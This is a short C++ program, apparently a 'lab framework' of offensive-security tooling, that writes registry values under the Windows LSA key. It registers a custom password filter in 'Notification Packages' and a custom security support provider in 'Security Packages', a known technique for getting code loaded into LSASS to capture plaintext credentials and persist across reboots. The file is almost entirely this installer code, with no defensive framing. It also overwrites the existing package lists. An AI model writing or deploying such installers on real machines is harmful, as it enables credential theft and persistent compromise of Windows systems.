#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_ // prevent winsock.h inclusion
#include <windows.h>
#include <iostream>

void AddRegistryValue(const char* path, const char* name, const char* value)
{
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE, &hKey);

    RegSetValueExA(
        hKey,
        name,
        0,
        REG_MULTI_SZ,
        (BYTE*)value,
        strlen(value) + 1
    );

    RegCloseKey(hKey);
}

void InstallPasswordFilter()
{
    std::cout << "[*] Installing Password Filter...\n";

    AddRegistryValue(
        "SYSTEM\\CurrentControlSet\\Control\\Lsa",
        "Notification Packages",
        "PasswordFilter"
    );
}

void InstallSSP()
{
    std::cout << "[*] Installing SSP...\n";

    AddRegistryValue(
        "SYSTEM\\CurrentControlSet\\Control\\Lsa",
        "Security Packages",
        "WindowsSSP"
    );
}

int main()
{
    std::cout << "LSA Lab Framework\n";
    std::cout << "1. Install\n2. Exit\n> ";

    int choice;
    std::cin >> choice;

    if (choice == 1)
    {
        InstallPasswordFilter();
        InstallSSP();
        std::cout << "[+] Installed. Reboot required.\n";
    }

    return 0;
}